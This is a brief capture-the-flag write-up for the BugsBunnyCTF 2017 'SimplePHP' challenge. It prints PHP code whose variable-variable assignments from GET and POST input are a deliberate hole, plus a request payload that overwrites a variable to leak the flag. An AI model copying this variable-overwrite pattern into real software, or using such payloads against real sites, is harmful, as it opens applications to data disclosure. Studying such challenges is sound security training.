# Challenge
```php 
<?php
include "flag.php";
$_403 = "Access Denied";
$_200 = "Welcome Admin";
if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p...");
if ( !isset($_POST["flag"]) )
	die($_403);
foreach ($_GET as $key => $value)
	$$key = $$value;
foreach ($_POST as $key => $value)
	$$key = $value;
if ( $_POST["flag"] !== $flag )
	die($_403);
echo "This is your flag : ". $flag . "\n";
die($_200);
?>
```

# Solution 
payload:
```
http://34.253.165.46/SimplePhp/index.php?_200=flag
POST:
flag=1
```

# Refference
+ BugsBunnyCTF2017 : SimplePHP
+ [chybeta : SimplePHP](https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/#SimplePHP)